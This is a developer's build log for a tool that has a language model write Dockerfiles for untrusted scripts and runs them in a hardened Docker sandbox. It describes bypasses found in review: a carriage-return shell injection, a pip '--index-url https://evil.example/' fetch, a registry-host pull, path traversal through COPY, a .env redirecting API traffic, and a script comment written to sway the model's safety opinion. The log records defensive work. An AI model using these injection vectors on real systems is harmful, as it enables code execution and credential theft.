# Build log

What was built, what broke, and what was decided. Written for someone who has not seen this
project before, so entries are named for what they are rather than for when they were
scheduled.

`README.md` says what runs today and `ARCHITECTURE.md` holds the invariants and the
decision log. This file is the record of how those got that way, including the parts that
were wrong first. Nothing here is tidied after the fact: where a fix was the wrong shape,
the wrong shape is still described, because that is the part worth reading.

Updated 2026-08-30.

## Where this is
Built and tested: the sandbox that holds the untrusted script, the model layer, the
deterministic gate every Dockerfile passes before a build, the repair loop, the workspace
that is the only code here handling a path, the closed event vocabulary with its provenance
labels, and the token budget.

Not built: the verdict and the trace. The command line reports what a script did and what
it cost; nothing yet decides what that behaviour means. The model also has no tools: it
reads the script once and writes a Dockerfile, which makes this a workflow with a feedback
loop rather than an agent.

276 tests, 263 of which need neither Docker nor an API key. Both suites run on every push
and every pull request.

## The default provider, decided 2026-08-22
`anthropic:claude-sonnet-5`. The native SDK with strict tool use, which is the only path
that grammar-constrains Claude's arguments, and cheap enough that the capped repair loop can
spend its attempts without cost being the reason a run stops.

This was a decision with nothing implementing it until 30 August: `make_llm(spec)` requires
a spec, and nothing chose one because nothing started a run without being handed one. The
command line was the first caller that had to pick, and it is where the default now lives,
as `DEFAULT_SPEC` in `envforge/__main__.py`.

## It runs, 2026-08-30
`envforge/__main__.py`. The first caller this project has had. Everything under it was
driven by tests until now, and the first real run is the only reason the two things below
were found rather than deferred again.

The run, verbatim, against a script importing `requests` and reaching for the network:

    asking               attempt 1: asking for a Dockerfile
    wrote                got 142 characters
    building             building envforge-c32a02687da...:attempt1
    running              running envforge-c32a02687da...:attempt1
    finished             the script ran and exited 0

    --- the Dockerfile that was built ---
    FROM python:3.11-slim
    COPY hello.py /app/hello.py
    RUN ["pip", "install", "--no-cache-dir", "requests"]
    ENTRYPOINT ["python", "/app/hello.py"]

    --- what the script did (exit 0) ---
    [stdout, written by the container, not by us]
      | resolving example.com ...
      | network refused, as expected: ConnectionError
      | done

One model call, 1692 tokens. The build had network, since pip needed it, and the run did
not, which is the line the whole design rests on and which had never been demonstrated
outside a test before.

**Two failures a command line cannot ship with.** Both are the same mistake in different
places: a run that cannot say honestly that it failed.

A spent budget fell back to the Dockerfile we write ourselves, copying the shape of a
second refusal. A refusal is the model judging the script, which is information about the
script. A spent budget is information about us. Building on it printed a verdict no
judgment went into and called it a success. It now ends the run, which is also what makes a
generous ceiling safe: hitting it means something went wrong rather than that an allowance
ran out.

A provider failure was not caught at all. A dead key, an empty account and a rate limit are
none of the three `LLMError` types the loop handles, so each escaped the generator: no
outcome, no `finished` event, and whatever had been spent unrecorded. They are now one
`ProviderUnavailable`, deliberately not an `LLMError` so it cannot reach the repair path.
If it ever did, we would build our own Dockerfile, run it, and print an ordinary-looking
verdict on a run the model never saw.

**The first report hid the product.** It printed the exit code and stopped, so the actual
output of the script, which is the only thing this tool exists to show, was not there. Found
by running it, not by reading it. The report now ends with what the container wrote,
labelled as the container's words rather than ours.

**Where the leak test was too narrow.** It scanned Markdown only, and eleven pieces of
internal vocabulary were still in the Python files, including one in a docstring here.
It now scans `envforge/*.py` and `tests/*.py` too. One match was a genuine English use of
the word, reworded rather than exempted, because an exemption list is where a strict check
starts leaking.

268 tests pass, 13 of them against the real daemon.

## What the review found in the command line, 2026-08-30
Blocked on first pass. Seven findings, two of them holes this change opened. Every one was
demonstrated by running something, not by reading the diff, which is the whole reason the
step exists.

**A sample could redirect our API traffic.** `load_env` read `./.env`. This tool analyses
samples nobody trusts, and running it from the sample's own directory is the natural
workflow, so a `.env` shipped beside a sample was loaded into the process and obeyed.
Setting `ANTHROPIC_BASE_URL` pointed the client at another host, which sends the key there
and lets the sample choose the Dockerfile the gate is handed. Reproduced before the fix:
the variable went from unset to `https://evil.example/v1/`.

Fixed with two rules rather than one. The path is fixed to the project's own directory and
never the working directory, and the names are an allowlist, because "the file is ours" is
a weaker guarantee than it sounds once a file is copied between machines and pasted from
instructions.

**A filename could steer the exit code.** `exit_code_for` matched substrings of the
outcome's `reason`, and `reason` splices in the gate's quoted line, which contains the
script's filename. A script named `x could not be reached.py` produced exit 3, telling a
caller to retry a provider that had answered perfectly well. `Outcome` now carries a typed
`kind` set where the outcome is built, and the exit code switches on that. Prose the sample
influences can no longer reach a machine-readable result.

The same finding had a second half worth more than the first: nothing coupled the producer
to the consumer, so rewording one sentence in the loop changed what the shell learned while
every test still passed. There is now a test that drives the real loop to each terminal
state and asserts the code a shell would actually get.

**Four provider failures still escaped.** The typed wrapper matched connection errors on
the class name, and `APITimeoutError` does not contain the word, though it subclasses the
connection error in both SDKs. Timeouts, 500, 503, Anthropic's 529 and a 404 from a
mistyped model name all escaped as tracebacks, each reproducing exactly the failure this
change claimed to have fixed. Matching is now by inheritance, and 404 and 5xx have their
own kinds.

**Container output could repaint the terminal.** `report` printed what a sample wrote
straight to the TTY, so a sample could clear the screen, set the window title and paint a
convincing `ok` summary, erasing the label saying the output was not ours. Control
characters are now escaped. The gate has refused non-printables for this exact reason since
August; the report was the one attacker-controlled channel to a terminal without the rule.

**Docker being absent or stopped was unhandled.** A stopped daemon looked like three failed
builds, spent three paid repair calls on a Dockerfile that was already correct, and then
reported the script as having run and failed. It now has its own exit code.

**`--check` was broken for two of three providers.** It passed `limit` to `models.list()`,
which the OpenAI SDK does not accept, so a working OpenAI or Groq key was reported as
unusable and the bare `except` hid that it was our bug.

**Two stale sentences and a stale table row**, all saying a spent budget falls back, and one
claiming no command line exists. Retired in the same commit.

The provenance value was wrong too: `provider_unavailable` was labelled `TOOL`, and the
provider's error text is neither a tool result nor the model's words. `PROVIDER` was added
rather than overloading `TOOL`, whose real user is about to be the tool loop.

272 tests pass.

## The second review, and the fix that was defeated by its own call site, 2026-08-30
Blocked again. Two of the seven fixes from the first pass did not hold, and both were
invisible in a diff: the suite was green while a failed run reported success and while a
sample's configuration was still being read.

**The `.env` fix never ran in production.** The function pinned the path to the project's
own directory. `main` then called it as `load_env(Path.cwd())`, so the parameter won and
the constant was never used. The test passed because it called the function rather than the
program. The allowlist added at the same time did hold, so the redirect was blocked, but a
sample could still choose which account paid for the run and remove the cost ceiling.

The lesson is narrow and worth keeping: a fix inside a function proves nothing about the
program until a test drives the entry point. The replacement test calls `main` from a
hostile directory, which is the only version of the check that could ever have failed.

**A failed run exited 0.** `Outcome.kind` was set on five terminal paths and missed on the
sixth, the one that gives up after three attempts. Its default was `"ran"`, so the CLI
printed FAILED and told the shell everything was fine. `Kind` is now a closed `Literal`
with no default, which turns the same mistake into a `TypeError` at construction.

The same finding had a second half. The success path set `"ran"` whatever the container did,
so a script exiting nonzero also reported 0 and the documented meaning of exit 1 was
unreachable. Three records described a behaviour the code could not produce.

**Five smaller ones.** 400 and 408 still escaped the provider wrapper, and a 400 is what
both providers return for a prompt over the context window, which this tool can produce.
`printable` kept newlines, so a single string reaching the summary could paint whole forged
lines with no control character in it, and it let bidirectional overrides through, which
reverse a line's reading order without one either. A stopped daemon still cost three paid
repair calls before reporting the script as having run; one `docker version` probe now costs
nothing and exits 5. `evidence = str(exc)` was the one evidence path with no bound, and a
provider message carrying model-chosen text put 200,000 characters into the next prompt.
And 108 images had accumulated, now removed in a `finally`.

One correction to the review: it estimated the images at 21GB. Layers are shared, so
`docker system df` reports 540MB. The clutter was real and the number was not.

276 tests pass.

## Keys come from a .env, reversed 2026-08-30
The original decision said the key was read from the environment and never from a file.
That is now the opposite: `.env.example` ships in the repository, a developer copies it to
`.env`, and the command line entry point loads it.

The reversal is recorded rather than the old sentence quietly deleted, because the reasoning
changed and not the facts. Reading from the environment is marginally safer, since a secret
in a process environment is not a secret on disk. It is also the wrong trade for a project
whose main cost right now is that nobody can run it: a `.env` with a checked-in example is
what a person cloning this expects, and every extra step between cloning and a first run is
a step where they stop.

What actually holds the line is unchanged and is now enforced rather than remembered. `.env`
is in `.gitignore`, `.env.example` carries placeholders only, and a test asserts both: that
`.env` is ignored by git, and that nothing in the example file looks like a credential. The
risk in this pattern was never the file, it was the day someone pastes a real key into the
example and commits it.

## The gate
An allowlist of six instructions and nothing else: FROM, COPY, RUN, USER, CMD, ENTRYPOINT.
No WORKDIR, no ENV, no ADD, no ARG, no SHELL, no multi-stage.

Continuations are refused before any other check, and that ordering is the point rather
than a detail. With no continuations every physical line is a whole instruction, so a
per-line allowlist is a sound analysis instead of a heuristic. Allow them and an
instruction can begin on a permitted line and do its work on the next one.

Four rules worth naming:

1. The written `FROM` must equal the declared `base_image`. Until this existed the
   separate declaration was decoration, and a model could declare one image and build
   another.
2. `FROM` may not name a registry host. `evil.attacker.com/img:1` is a valid reference,
   and building it makes the daemon pull from a host the attacker chose.
3. `RUN` is exec form, like `CMD` and `ENTRYPOINT`. There is no shell, so its arguments
   are a list we check one at a time rather than a string we match a prefix against.
   Every argument after the command must be a named package or one of four flags, so a
   URL, a git reference, a local path, or `--index-url` is refused.
4. `CMD` and `ENTRYPOINT` must be exec form. Shell form re-splits inside `/bin/sh -c`,
   which is the string-versus-list problem the sandbox already refuses to make with the
   docker command itself.

A digest is refused even though it pins harder than a tag, because a digest pins to one
architecture and the laptop is arm64 while CI is amd64.

The gate splits on `\n` and nothing else, exactly as Docker does, and refuses any
character that is not printable, a newline or a tab. Parser directives are refused too,
since `# escape=` changes which character continues a line.

## The carriage return, and why the first fix was the wrong shape
Reported 2026-08-24 by a review session and reproduced against the daemon before anything
changed. A lone `\r` is a line break to Python's `splitlines` and not to Docker, so this
was allowed:

    RUN ["pip", "install", "flask"]\rCMD ["$(echo INJECTED-AT-BUILD-TIME >&2)"]

The gate split it into two valid exec-form instructions. Docker kept it as one line,
failed to parse it as JSON, fell back to shell form, and ran the whole thing through
`/bin/sh -c` during the phase that has network. The injected command printed before the
build then failed with 127, which the loop would have called a repairable build failure
and retried, so the attacker got their execution and the agent tried again.

The reported fix was to add `\r` to the list of refused characters. That list was the
bug. It was written the same day to enumerate what `splitlines` breaks on and Docker does
not, and it omitted the most common member of its own category, which is what a blocklist
eventually does.

Replaced with two things that are properties rather than enumerations. The gate now splits
on `\n`, so its notion of a line is Docker's by construction. And the only characters
permitted anywhere are printable ones, newlines and tabs, which is an allowlist like every
other rule in the file and refuses things nobody thought of.

The cost is that CRLF Dockerfiles are refused, and that is chosen rather than accidental:
accepting them means telling a bare carriage return from one before a newline, and that
distinction is precisely what produced the bypass.

## What a second model found in the gate, 2026-08-24
Three real findings, all reproduced against the function before anything changed.

`RUN` as a string prefix meant `pip install` also matched
`pip install --index-url https://evil.example/ foo`, along with URLs, git references,
local paths and `--target /etc`. The allowlist read as "only installs happen here" while
permitting a fetch from any host during the one phase that has network. Moving `RUN` to
exec form is what closed it, because arguments became inspectable individually.

The metacharacter ban refused `pip install "flask>=2.0"`. `>` and `<` are redirection
operators and version-specifier operators at once, and a raw character scan cannot tell
them apart, so the normal way to pin a dependency was refused and the repair evidence
pointed at the wrong problem. Exec form removes the shell, so the ban is unnecessary
rather than merely relaxed. Verified against a real build: exec-form `RUN` resolves
through `PATH` and `flask>=2.0,<4` installs as 3.1.3.

`COPY` checked its source and ignored its destination, so `COPY s.py /etc/passwd` and
`COPY s.py /usr/local/bin/python` both passed. Destinations are now confined to `/app`.

That first fix was itself defeated, on 2026-08-25, by the first `..`. A prefix test on the
raw string passes `COPY s.py /app/../escaped/s.py`, and Docker writes the file to
`/escaped/s.py` with `/app` never created, verified against the daemon. The destination is
now normalised with `posixpath.normpath` before the containment test, which is the
difference between checking the string and checking the destination. The same change makes
the idiomatic `COPY s.py /app` legal, which the first fix refused and which would have
spent a repair attempt on every run that reached for the obvious form.

One finding was not a bypass and is worth keeping in view: Docker Hub is not a trust
boundary. Anyone can publish there, so `FROM eviluser/backdoor:1.0` is inside the rules
as written. The registry-host rule stops the daemon pulling from a host the attacker
named; it does not make the image trustworthy.

The repair loop: `envforge/agent.py` and `tests/test_agent.py`.
231 tests today, 218 needing neither Docker nor an API key, 13 against the real daemon.

## The repair loop
The plain repair loop. It defines `write_dockerfile` against the schema `Tool` already
enforces, asks, gates, builds, runs, and decides one thing over and over: could a
rewritten Dockerfile fix this. It yields `Event`s rather than printing, and the final
event carries an `Outcome`, so the graph engine and the trace module attach to
the same seam. There is still no `__main__`, so nothing runs from a shell.

Repairable, and each one spends an attempt: a gate rejection, a failed build, exit 126 or
127, and a reply that was refused-adjacent rather than refused, meaning `InvalidArguments`,
`Truncated`, or no tool call at all.

Terminal, because the script ran and what it did is the tool loop's problem: exit 0, exit 1,
exit 137, a 125 that came with a cidfile, and a timeout. A timeout is not a repair
candidate. The run happened.

Four decisions worth naming:

1. `gate` is a required constructor argument with no default. Every Dockerfile reaching
   the daemon was written by a model that just read untrusted text, so a loop that can be
   constructed without a gate is a loop that can build one unchecked. The gate fills in
   the real allowlist; the tests pass an explicit stub.
2. Repair is decided by whether the container started, not by its exit code. `RunResult`
   carries `start_error`, read from the daemon before the force-remove. This closes the
   gap the sandbox left open, and closes it better than the 126/127 test it replaced: those
   codes can be produced by a script that wants to look like a broken image, and a script
   that can choose an exit code has already started, so the field is empty for it.
3. The fallback Dockerfile goes through the same gate. One path from a Dockerfile string
   to the daemon, whoever wrote it. If our own fallback fails our own gate, the loop stops
   and says so rather than asking the model again.
4. The script text is bounded before it enters the prompt, for the same reason container
   output is bounded in the sandbox. Both are attacker-controlled text on the way to a
   model.

The model layer: `envforge/llm.py` and `tests/test_llm.py`.
48 tests, 39 without Docker or any API key, 9 against the real daemon.
The repository is public, and `main` rejects direct pushes: the ruleset requires a pull
request and a green `test` check, verified on 2026-08-23 by a push that was refused.

## The model layer
`LLM` Protocol, `AnthropicLLM` on the native SDK, `OpenAICompatLLM` covering OpenAI and
Groq through `base_url`, `Tool`, `Call`, `validate`, and `make_llm("provider:model")`.
Four failure types, because the loop has to tell them apart: `InvalidArguments` is
repairable, `Refused` is not, `Truncated` means the ceiling was hit, and a bare `LLMError`
means the response had no tool call at all.

`build_request` is a pure function on each provider, the same move as the sandbox's
`build_argv`, so the invariants are tested with no network: `strict` is asked for on
Anthropic and OpenAI, deliberately not on Groq, and `tool_choice` names the single tool.

Four decisions worth naming:

1. `Tool` validates its own schema at construction. Strict mode requires
   `additionalProperties: false` and a `required` list, and both providers enforce that at
   request time. Without the check, a caller's malformed schema arrives as a 400 in the
   middle of the repair loop and reads like a model failure.
2. Groq reads `GROQ_API_KEY` and the key is passed explicitly. Handing the openai client a
   `None` key makes it fall back to `OPENAI_API_KEY`, which would send an OpenAI secret to
   Groq's servers and surface as a 401 from the wrong provider.
3. The tool call is found by scanning `content`, never by index. Thinking is adaptive by
   default on Sonnet 5, so the first block is usually a thinking block.
4. `Call.model` is read off the response rather than copied from the request, so the trace
   records what actually answered.

The fakes build their canned responses through `anthropic.types.Message.model_validate`
and `openai.types.chat.ChatCompletion.model_validate`. A payload that could not have come
from the real API fails the test instead of passing it.

The sandbox: `envforge/sandbox.py` and `tests/test_sandbox.py`.
24 tests, 15 without Docker and 9 against the real daemon, all passing.
A `.venv` with pytest exists in the repo directory and is gitignored.
Why the memory test asserts both exit 137 and the absence of `MemoryError` in
stderr is recorded below.

## The sandbox
`Sandbox` protocol, `DockerSandbox`, `Limits`, `BuildResult`, `RunResult`, `SandboxError`.
The two argv builders `build_argv` and `run_argv` are pure functions returning a list,
so the invariant tests read the argv the code actually builds without touching Docker.
Every hardening flag from ARCHITECTURE.md invariant 5 has a test, and so does the absence
of `--network` on build and the placement of script arguments after the image name.

Three decisions worth naming:

1. Exit code 125 is ambiguous. Docker returns it when the CLI rejects our command, and a
   hostile script can call `exit(125)` to imitate that. `--cidfile` settles it: docker
   writes the file only once the container exists, so 125 with no cidfile raises
   `SandboxError` and 125 with one is returned as data. Our bug crashes, the script's
   behaviour feeds the repair loop.
2. `--memory-swap` is set equal to `--memory`. Verified by reading the cgroup back from
   inside a container on 2026-08-22: with the pin, `memory.max` is 134217728 and
   `memory.swap.max` is 0. Drop the flag and `memory.swap.max` becomes 134217728 too, so
   the container gets a second 128m of swap and the cap means twice what it says.
3. Output is bounded head plus tail, not head alone. The head says what ran and the tail
   says how it died, and a truncation marker names the number of bytes cut.

Two smaller ones: the build context is a temp dir holding exactly the Dockerfile and the
script, so the daemon never receives the working directory, and `HOME=/tmp` is set on the
run because a read-only root without a writable home fails half of the tooling for
reasons that have nothing to do with the script under test.

## Why the memory test asserts two things
The test requires exit 137 and requires that `MemoryError` does not appear in stderr,
because the two describe different enforcers. `MemoryError` means an allocation was
refused and the process stayed alive to handle it, which is a catchable Python exception:
the script can swallow it and keep running. A cgroup kill is `SIGKILL`, which no code in
any language can catch, block, handle, or ignore. That uncatchability is the entire
property `--memory` buys, so a run that reports `MemoryError` has proved the cap is being
enforced by something the script can negotiate with.

Exit 137 alone proves nothing, since a script can call `sys.exit(137)` to imitate a kill,
the same imitation trick that `--cidfile` exists to defeat for 125. The pair is the claim:
killed from outside, not stopped from inside.

Both facts are therefore asserted as one tuple rather than two statements. Sequential
asserts stop at the first failure, so the run that matters most, 137 together with a
`MemoryError`, would report only `assert "MemoryError" not in stderr` and hide the exit
code that makes it the worst case. The single assertion prints
`was (137, True), wanted (137, False)`, checked by forcing the failure on 2026-08-22.

## Host facts, measured not assumed
Read back on 2026-08-22 from inside a container on this machine:
cgroup v2 (the v1 path `memory/memory.limit_in_bytes` does not exist), `--memory 128m`
lands as exactly 134217728 bytes, and `ulimit -v` under our own run flags is `unlimited`,
so `RLIMIT_AS` is not a second ceiling competing with the cgroup. Three of the four
candidate causes for a memory-test failure are therefore settled by observation. The one
that remains theory is the Docker Desktop VM running out of memory itself, which needs
total container memory above the VM's own size to reach.

## The 126 witness, found by experiment 2026-08-23
The loop first treated exit 126 and 127 as repairable outright, with the attempt cap as
the only defence against a script exiting 126 to look like a broken image. A probe settled
it: two images that both exit 127, one with a broken `ENTRYPOINT` and one whose script
calls `exit 127`. The broken one leaves `State.Error` on the container with the full runc
message naming the missing file, and the imitator leaves it empty. The docker CLI also
writes its half to stderr, which the sandbox was already capturing without knowing what it
had.

So the witness existed, and the mechanism now rests on it instead of on the exit code. Two
Docker tests assert both directions, because a witness nobody checked against the real
daemon is an assumption.

## Size, settled 2026-08-23
There is no line budget any more. The old rule said roughly 650 including tests and was
being compared against the source number alone, so it read as nearly met while the real
total was 1483. Raising it would have kept the actual problem: the count was changing the
code, trimming docstrings that carried the reasoning and opening three entries in a row
with a note about length instead of the work.

What replaces it is not countable. A file whose responsibility cannot be stated in one
sentence is doing two things and wants splitting, and a module that wants a subdirectory
has outgrown the project.

## What the gate does not do, stated rather than implied
`pip install <name>` runs that package's own setup code at build time, and build has
network. No allowlist of Dockerfile instructions can prevent that, because installing
packages is the product. It is contained by the container and by the fact that the run
phase trusts nothing the build produced, not by the gate.

Whether the RUN allowlist is workable has not been measured, because no real model has
written a Dockerfile against it yet. `apt-get update && apt-get install -y foo` is the
idiomatic form and is refused, so the model must write two RUN lines. The first live call
will show whether that costs repair attempts. Excluding WORKDIR and ENV is the same
question and follows CLAUDE.md's list exactly.

## Languages, settled 2026-08-25
Python and Bash, and now the code says so rather than only the README. Nothing validated
the language before, so a Ruby script was simply passed to the model, which usually
answered, and the run looked like it worked. Two refusals then reached
`default_dockerfile`, which has no base image for Ruby and raised `ValueError` straight
out of the generator.

An unsupported language is now refused before the model is consulted at all, and the
refusal is an `Outcome` like any other rather than an exception. Bash also gained its
first test, having been claimed since the first commit and exercised by nothing.

Where the label comes from, decided 2026-08-25 after a second model reviewed it: the file
extension, with a CLI flag to override, and never the model. `language_for()` reads the
extension and nothing else. A shebang would be more accurate and would mean reading
attacker-controlled content to make the decision.

The honest form of that rule matters, because the first version of it was wrong. "The
model may not decide the language" is not a security rule here. A model-decided label is
still bounded by the door check, so it could only steer between python, bash and refusal,
and the gate checks whatever follows either way. It survives as an engineering rule for
two concrete reasons rather than as a principle. Asking the model would mean every run
sends attacker text to a model before the door check, which is exactly what the door check
was added to prevent. And the refusal boundary would become steerable by script content: a
Ruby file opening with a comment claiming to be Python could flip itself from refused to
attempted, so the same file would not be handled the same way twice.

`DEFAULT_BASE` and `DEFAULT_COMMAND` are now one `LANGUAGES` table, so adding a language is
one entry rather than three that can disagree. The gate deliberately does not import it: it
decides what may run during a build and has no business knowing what language anything is.

What a third language actually needs is not a `LANGUAGES` entry. It is an entry in the
gate's `RUN_COMMANDS`, which today permits `pip` and `apt-get` and nothing else, so a Ruby
script with a gem dependency or a Node script with an npm dependency cannot be built no
matter what the model writes.

A wrong label cannot cost a compromise, but it can cost an honest report, and that belongs
to the tool loop. Label a bash script as python, the fallback runs `python /app/s.sh`, it exits
1 on a syntax error, and the loop calls that terminal with `ok=True` because a nonzero exit
is the verdict's problem rather than the loop's. The verdict would then be formed from a
run in which the script's own logic never executed.

## Known gaps
Nothing has hit a real provider. The request shape is asserted against our own builders and
the responses are parsed through the SDKs' own models, which is stronger than a hand-rolled
fake, but no test has proved the Anthropic API accepts the request we build. One live call
would settle it and costs a few cents.

`OpenAICompatLLM` sends no token ceiling. OpenAI and Groq disagree about the parameter name
and neither has been exercised, so nothing was guessed. Anthropic sends `max_tokens`.

Timeout returns `exit_code=None` with `timed_out=True`. Nothing yet decides what a
timeout means for the verdict.

`--cpus` and `no-new-privileges` are still unverified by observation. Both appear in the
argv and have tests asserting that, which is a weaker claim than the five flags checked by observation.

## CI, added 2026-08-22
`.github/workflows/tests.yml` runs both suites on push to `main` and on pull requests.
The docker half is the reason it exists: GitHub's Linux runners ship a real daemon, so
the hardening flags stay checked on a machine that is not the development one. Steps are named
separately so a red build says which half broke.

Two consequences for later work. The suite must never need an API key, so the fake
LLM layer planned at the time is a CI requirement and not a convenience. And this is signal,
not enforcement: turning it into an actual gate needs branch protection on `main`, a
repository setting nobody has flipped yet.

## Refusal policy, decided 2026-08-23
The input is a script nobody trusts and the model has cybersecurity safeguards, so a
refusal is an expected outcome rather than an edge case. Decided:

Retry once, on a counter separate from the repair budget. The repair loop works because
each attempt carries new evidence; a refusal retry resends identical text and hopes the
sampler lands elsewhere, so letting the two share a counter spends repair attempts on
something repair cannot fix.

After a second refusal, stop asking and fall back to a Dockerfile we write ourselves. For
Python and Bash that needs no model, so a refusal never kills the run. A loop that keeps
asking after a refusal reads as a loop that asks until the classifier gives up, and the
repository is public.

Keep the reason. It arrives on the refusing response itself, `stop_details` on Anthropic
and `message.refusal` on OpenAI, so it costs no extra call. `Refused.reason` carries it as
a structure. It is recorded and shown beside the observed behaviour, labelled advisory.

It is never the verdict. The script under test is inside the prompt, so it writes part of
the text the model forms its opinion from: a hostile script can open with a comment
claiming to be a course exercise and buy itself a clean explanation. The one case where
the opinion is the whole story is when the fallback Dockerfile also fails to build, and
then the honest report is that no run happened and here is what the model said.

## Reviewed 2026-08-23 by a second model, and the plan changed
The question was whether this is an agent. It is not, by the usual definition: the model
fills in one artifact and never chooses what happens next. A peer project held up as the
counterexample turned out to have the same property, a fixed graph whose conditional edges
are plain Python, one tool offered only when a regex on the build log allows it.

What crosses the line is the model choosing which tools to call and when it has enough,
so the plan now builds that. The boundary stays where it is: the model gains agency over
what it learns, never over the gate, the sandbox flags, the decision to build or run, or
the verdict.

Five shapes have to be decided before the loop, because each is a rewrite otherwise:

1. A `Workspace` protocol behind the tools. Tools never see a path; a Workspace lists
   files by name and reads one bounded, populated by explicit ingestion, which is the
   single place symlinks are resolved or refused. The hosted service and a Kubernetes
   sandbox then become implementation swaps.
2. `Sandbox.build` takes a manifest rather than one script. Once a tool reveals a
   `requirements.txt`, the model writes `COPY requirements.txt` and the build fails on a
   file the context does not hold, so the tools would manufacture the failure and then
   spend repair attempts on it.
3. The trace is a flat log whose every record carries a provenance field: model, tool
   result, container output, or us. Without it a reader cannot tell which strings are
   attacker-influenced, and a browser rendering them guesses wrong.
4. `Outcome` slims to references and totals. It currently embeds raw request and response
   JSON per call, which is harmless at four calls and megabytes at fifteen turns.
5. The bound is a token budget, not a turn cap, with headroom reserved for the final
   forced call. Input tokens grow every turn, so a turn count measures nothing.

Two calls worth recording. The seam between the plain engine and LangGraph is the event
vocabulary, not the node topology, because a topology-shaped interface cannot be honoured
by a plain loop. And the semantic safety check stays outside the tool loop, on the script
alone: a sibling file is a better injection vehicle than the script, and an opinion formed
from a fixed input is comparable across runs while one formed from whatever the model
probed is not.

## Three bugs, found in review and fixed 2026-08-24
`base_image` never reached the gate. The gate is now a `Gate` Protocol taking the
dockerfile, the declared base image, and the set of filenames a `COPY` may name. All three
are passed rather than inferred, and `allowed_files` holds only the script today so the
manifest arriving later grows the set instead of changing the signature. Two
tests cover it, one asserting what the gate is handed and one where a gate catches a model
declaring `python:3.12-slim` while writing `FROM ubuntu:22.04`.

The fallback had no dead end on a failed build. Two refusals, fallback, gate passes, build
fails, and the loop set `dockerfile = None` and asked the model again, which the refusal
policy rules out. Worse, if the gate then rejected that model-written Dockerfile the run
reported it as our own fallback failing our own gate. All three fallback dead ends now go
through one `_dead_end` helper so they cannot drift apart again.

Evidence from a first-attempt unusable reply was computed and dropped, because there is no
previous Dockerfile and the opening template has no slot for it. There is now a third
template, `RETRY`, for the case where the reply was unusable but there is nothing to
correct. The test asserts the two prompts differ.

## The workspace
`envforge/workspace.py`. The only code in the project that handles a path.

Tools and the sandbox will ask for names and contents and never receive a path, so there
is no path left for anything to manipulate. Everything that can go wrong with a filesystem
happens once, at ingestion, rather than on every read. That is the whole design: a
`requirements.txt` beside an untrusted script was discovered rather than chosen, and
resolving it once and checking where it landed is a rule that holds forever, while
checking a path at each use is a rule that holds until somebody adds a use.

Three decisions worth naming:

1. Resolve first, then check containment. A prefix check on the joined path passes a
   `requirements.txt` symlinked to `~/.ssh/id_ed25519`, because the joined path is inside
   the directory and only the target is not.
2. The script and its siblings are treated differently. A symlinked script is followed,
   because the user named that file and following it is doing what they asked, and the
   root becomes wherever it actually lives. Siblings were discovered rather than named, so
   they may not resolve outside that root.
3. Siblings come from a fixed menu per language, held in the `LANGUAGES` table, rather
   than from a caller-supplied path or a pattern. Traversal has nothing to traverse.

`Files` holds contents rather than locations, which is what makes the later versions drop
in without touching a caller: an upload has no directory, and a build running as a
Kubernetes Job has no host filesystem to point at.

## The build context, taken as contents
`Sandbox.build` takes a mapping of names to contents instead of a `Path`, and `Agent.run`
takes a `Workspace` instead of a script path. The agent no longer receives a path at all,
and a test asserts that by reading the signature, because if a `Path` ever comes back the
second read comes back with it.

Three things landed together.

The script is read exactly once. Before this it was read twice, at `agent.py` for the
prompt and again by `shutil.copy` when the build context was assembled, so a file that
changed between them meant the model reviewed one script and the container ran another.
The test swaps the file on disk after `gather()` and asserts the build context still holds
the original bytes.

The build context can hold more than one file, so a manifest can be copied into an image.

`allowed_files` reaching the gate is the set the workspace actually gathered rather than a
hardcoded singleton, so a `COPY` may name the script and any manifest beside it and
nothing else. That is the rule that stops the model writing `COPY requirements.txt` for a
file the build cannot see, which the tool loop would otherwise have manufactured.

The sandbox refuses a name that is not a bare filename. The workspace only ever produces
bare names, so that is defence in depth rather than the guard that matters: the sandbox
writes those names into a directory and should not have to trust whoever handed them over.

A context file may not be named something the build itself interprets. Found in review
before this piece merged and verified against the daemon: the files loop runs after the
gated Dockerfile is written, so `{"Dockerfile": ...}` overwrote it and the container ran
instructions the gate never saw. Both `Dockerfile` and `dockerfile` built and ran, the
second because a case-insensitive filesystem collides them. Not a directory escape, a
complete bypass of the only check there is. `.dockerignore` is refused on the same
reasoning, and an empty name now raises `SandboxError` rather than `IsADirectoryError`.

Reaching it required a workspace holding a file with that name, which today is impossible
because the sibling menu is ours and the extension rule keeps a script called Dockerfile
out. It becomes reachable the moment the tool loop grows that menu, which is a plausible thing
to want.

A silent policy change worth naming: a script with a latin-1 comment used to run with
replacement characters, because the agent read with `errors="replace"`. There is one
reader now and it is strict, so such a script is refused at ingestion. Defensible, but a
decision rather than a consequence.

## The outcome, slimmed to totals
`Outcome` carries totals rather than payloads. It held every `Call`, and a `Call` holds the
full request and response JSON, which is harmless at four small calls and megabytes once a
tool loop runs fifteen turns, on the one event every consumer has to hold.

It now carries a `Usage` of call count and token totals, plus a `run_id`. The whole `Call`
rides the `wrote` event instead, where a consumer reads it and lets it go, which is what
the event stream was for. `run_id` is what ties the summary back to the bodies once they
are elsewhere.

The alternative was dropping the bodies until the trace module exists, which would have
thrown away the wire JSON the trace is being built to record.

Review correction, 2026-08-27: a 5.6 Sol review found that the `wrote` event carried a
`Call` but no `run_id`, and that the old eight-character ID could collide across long-lived
traces. `run_id` is now a full UUID, created before every terminal path including an
unsupported language, and carried on `wrote`. `Usage.calls` now counts every request sent,
including a refusal, while token totals remain limited to replies that returned usage.
Two new tests cover the full ID and the unsupported-language path. 207 tests pass.

That last sentence held for four days only. The budget piece below found that the failures
were the replies not returning a usage, so the totals now count every reply, and the
contrast between `calls` and tokens that this paragraph draws no longer exists.

The same review asked for raw request and response bodies on failed provider replies. That
needs the provider error types to retain wire data, so it is deferred explicitly to the trace module's design rather than half-built here.

## The event vocabulary
`envforge/events.py`. The twelve kinds an engine may yield, and who wrote every string in
each one. `Event` checks both at construction, so an engine that invents `node_entered`
fails there rather than putting a record in the trace that nobody can label.

The closed set is the smaller half. The labels are the reason this had to happen before
the LangGraph port and before the trace: a reader cannot tell whether a string came from
us, the model, a container or the files the run was handed, and neither can the
trace module. Only the code that emits the event knows, so a label added later is a guess
dressed up as a record.

Authors are a set per string, not one value per event. Three of the twelve made that
necessary rather than tidy. `gate_rejected` carries a Dockerfile that is the model's on
every path but one, since after two refusals the file we wrote ourselves goes through the
same gate and can be rejected there too. `gate_rejected` is our own sentence quoting the model's line
back at it, since the gate's reason includes the offending line verbatim. And the `call`
on `wrote` holds a request carrying our system prompt and the script, and a response
written by the model. One value on either would have been false, and picking the "least
